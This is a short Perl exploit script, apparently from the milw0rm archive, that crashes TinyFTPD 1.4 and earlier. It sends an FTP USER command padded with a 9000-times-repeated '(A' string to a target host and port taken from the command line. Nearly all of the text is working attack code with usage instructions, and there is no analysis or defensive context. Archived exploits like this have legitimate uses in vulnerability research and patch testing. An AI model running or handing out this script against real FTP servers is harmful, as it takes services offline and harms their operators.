#!/bin/perl
#
# Title: TinyFTPD <= 1.4 USER command D.O.S
# Credits: [Oo]
#
#
use IO::Socket;

print "[i] TinyFTPD <= 1.4 USER command D.O.S\n";
print "[i] coded by [Oo]\n";


if (@ARGV < 2)
{
 print "\n[*] Usage: tinyftpd_dos.pl host port\n";
 print "[*] Exemple: tinyftpd_dos.pl 192.168.0.1 21\n";
 exit;
}


$ip = $ARGV[0];
$port = $ARGV[1];

$exploit = "(A" x 9000;

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Connecting: Failed!\n";
print "\n[+] Connecting: Ok!\n";
print "[+] Sending bad request...\n";

print $socket "USER $exploit\n";
sleep(5);
close($socket);

print "[?] DoSed?\n";

# milw0rm.com [2006-05-06]
